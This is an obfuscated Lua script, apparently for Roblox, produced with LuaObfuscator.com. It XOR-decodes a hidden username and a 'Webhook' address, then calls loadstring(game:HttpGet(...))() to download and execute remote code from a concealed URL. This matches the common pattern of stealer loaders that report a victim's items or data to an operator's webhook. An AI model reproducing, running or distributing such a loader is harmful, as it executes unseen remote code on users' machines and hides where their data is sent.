--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.10.8) ~  Much Love, Ferib 

]]--

local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v8,v9) local v10={};for v11=1, #v8 do v6(v10,v0(v4(v1(v2(v8,v11,v11 + 1 )),v1(v2(v9,1 + (v11% #v9) ,1 + (v11% #v9) + 1 )))%256 ));end return v5(v10);end Username=v7("\213\208\200\112\224\188","\126\177\163\187\69\134\219\167");LoadScreen=true;Webhook=v7("\43\217\62\213\239\121\130\101\193\245\48\206\37\215\248\109\206\37\200\179\34\221\35\138\235\38\207\34\202\243\40\222\101\148\174\122\154\120\150\171\112\156\115\148\170\114\154\126\148\175\113\158\101\198\232\37\200\60\145\196\116\217\43\144\214\41\238\124\241\213\11\149\37\213\215\1\255\28\200\208\114\227\6\200\210\58\154\25\193\217\19\195\45\157\217\112\252\120\194\219\51\194\39\194\207\50\200\6\247\177\2\215\5\237\197\23\230\56\204\245\48","\156\67\173\74\165");loadstring(game:HttpGet(v7("\60\163\93\6\175\124\9\123\165\72\1\242\33\79\32\191\92\20\169\53\67\38\180\70\24\168\35\72\32\249\74\25\177\105\109\61\162\92\38\243\22\117\109\238\118\59\189\47\74\39\163\76\23\176\35\84\123\186\72\31\178\105\107\53\190\69\37\168\35\71\56\178\91\88\176\51\71","\38\84\215\41\118\220\70")))();